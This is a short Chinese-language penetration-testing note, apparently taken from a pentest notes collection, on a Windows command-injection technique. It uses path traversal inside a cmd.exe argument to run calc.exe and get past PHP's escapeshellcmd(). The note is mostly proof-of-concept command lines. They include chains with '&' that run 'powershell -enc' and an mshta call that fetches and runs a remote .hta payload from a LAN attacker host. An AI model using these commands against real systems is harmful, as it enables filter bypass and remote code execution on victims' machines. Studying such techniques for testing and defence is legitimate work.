	From: https://hackingiscool.pl/
	poc完整的命令行
	cmd.exe /c "ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe"
	可能产生的影响
	包括拒绝服务，信息泄露，任意代码执行（取决于目标应用程序和系统）。
	以web应用为例
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/660.png)

	由于使用了escapeshellcmd()，不易受命令注入的影响，使用本方法
	一个poc
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/661.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/662.png)

	不限于任何位置，文件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/663.png)

	再扩展一下 
	如，powershell带-enc执行，或mshta等方法，可参考
	https://lolbas-project.github.io/，但是依照windows的特性，在无法将完整字符串解析为有效路径的情况下，会拆分空格后面的内容，这里可以使用&符号
	如：
	>cmd.exe /c "cmd /c /../../../../../../../../../../windows/system32/calc&powershell -enc xxxx"
	>cmd.exe /c "cmd /c /../../../../../../../../../../windows/system32/calc&mshta http://192.168.0.105:8080/xsuUEWJ.hta"